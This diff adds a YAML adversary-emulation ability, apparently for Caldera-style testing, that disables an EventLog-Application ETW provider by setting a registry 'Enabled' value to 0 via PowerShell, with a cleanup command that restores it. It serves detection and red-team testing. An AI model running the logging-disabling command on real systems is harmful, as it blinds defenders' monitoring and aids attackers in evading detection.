@@ -1,0 +1,23 @@
+---
+- id: f9c6eeb9d9ac03538e30587920cfc206
+  name: Disable EventLog-Application ETW Provider Via Registry - PowerShell
+  description: This atomic simulates an activity where an attacker disables a specific
+    ETW provider from the EventLog-Application ETW Auto Logger session using the powershell.exe
+    "New-ItemProperty" cmdlet to update the Windows registry value "Enabled". This
+    would effectivly remove that provider from the session and cause to not emit any
+    logs of that type. The changes would only take effect after a restart.
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{B6D775EF-1436-4FE6-BAD3-9E436319E218}"
+          -Name Enabled -Value 0 -PropertyType "DWord" -Force
+        payloads: []
+        cleanup: New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{B6D775EF-1436-4FE6-BAD3-9E436319E218}"
+          -Name Enabled -Value 1 -PropertyType "DWord" -Force
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
